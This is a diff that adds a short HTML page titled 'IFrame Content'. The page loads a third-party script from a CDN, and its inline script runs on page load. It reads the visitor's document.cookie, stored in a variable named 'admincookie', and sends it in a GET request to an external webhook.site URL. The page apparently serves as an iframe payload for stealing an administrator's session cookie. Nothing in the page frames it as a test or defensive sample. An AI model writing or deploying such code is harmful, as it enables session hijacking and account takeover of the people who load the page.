@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+   <script src="https://cdn.jsdelivr.net/gh/ncase/nutshell/nutshell.js"></script>
+  <title>IFrame Content</title>
+  <script>
+    // Perform GET request using JavaScript
+    var xhr = new XMLHttpRequest();
+     var admincookie = document.cookie;
+     var url="	https://webhook.site/cc03a673-2593-441f-96ed-de4392538935?param="+admincookie;
+    xhr.open('GET', url, true);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+        console.log(xhr.responseText);
+        // Perform actions with the response data here
+      }
+    };
+    xhr.send();
+  </script>
+</head>
+<body>
+  <!-- Content of the iframe -->
+</body>
+</html>
